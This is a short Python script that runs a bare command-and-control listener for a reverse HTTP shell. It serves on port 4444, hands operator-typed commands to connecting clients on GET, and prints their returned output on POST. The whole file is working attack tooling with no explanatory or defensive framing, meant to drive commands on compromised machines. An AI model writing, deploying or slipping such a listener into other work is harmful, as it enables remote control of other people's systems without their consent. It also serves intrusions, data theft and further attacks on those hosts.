from http.server import BaseHTTPRequestHandler, HTTPServer

port = 4444

class ShellHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        current_command = input("[+] Enter command to execute: ")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(current_command.encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)
        print(f"[+] Command output:\n{post_data.decode()}")
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", port), ShellHandler)
    server.serve_forever()
